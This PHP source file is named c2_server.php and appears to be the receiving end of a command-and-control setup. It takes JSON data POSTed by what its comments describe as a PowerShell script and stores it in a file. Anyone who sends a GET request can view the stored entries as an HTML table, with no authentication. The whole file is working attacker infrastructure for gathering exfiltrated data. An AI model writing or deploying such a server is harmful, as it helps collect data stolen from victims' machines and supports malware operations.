<?php
// c2_server.php

// File path to store received data
$dataFilePath = 'received_data.json';

// Handle POST request to receive data from PowerShell script
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the raw POST data
    $postData = file_get_contents('php://input');
    
    // Decode JSON data
    $data = json_decode($postData, true);

    // Check if data is valid JSON
    if (json_last_error() === JSON_ERROR_NONE) {
        // Append the received data to the file
        file_put_contents($dataFilePath, $postData . PHP_EOL, FILE_APPEND | LOCK_EX);
        
        // Send response back to the PowerShell script
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'message' => 'Data received successfully']);
    } else {
        // Invalid JSON received
        header('Content-Type: application/json');
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON data']);
    }
    exit;
}

// Handle GET request to display the stored data
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Check if the data file exists
    if (file_exists($dataFilePath)) {
        // Read the data from the file
        $data = file($dataFilePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        
        // Convert each line to an array of JSON objects
        $jsonData = array_map('json_decode', $data);

        // Display the data
        echo '<!DOCTYPE html>';
        echo '<html lang="en">';
        echo '<head>';
        echo '<meta charset="UTF-8">';
        echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
        echo '<title>Received Data</title>';
        echo '<style>';
        echo 'table { width: 100%; border-collapse: collapse; }';
        echo 'th, td { padding: 8px; border: 1px solid #ddd; }';
        echo 'th { background-color: #f4f4f4; }';
        echo '</style>';
        echo '</head>';
        echo '<body>';
        echo '<h1>Received Data</h1>';
        echo '<table>';
        echo '<thead>';
        echo '<tr><th>Type</th><th>Content</th><th>Timestamp</th></tr>';
        echo '</thead>';
        echo '<tbody>';
        
        foreach ($jsonData as $entry) {
            if (is_object($entry)) {
                echo '<tr>';
                echo '<td>' . htmlspecialchars($entry->type) . '</td>';
                echo '<td>' . htmlspecialchars($entry->content) . '</td>';
                echo '<td>' . htmlspecialchars($entry->timestamp) . '</td>';
                echo '</tr>';
            }
        }

        echo '</tbody>';
        echo '</table>';
        echo '</body>';
        echo '</html>';
    } else {
        echo 'No data available.';
    }
}
?>
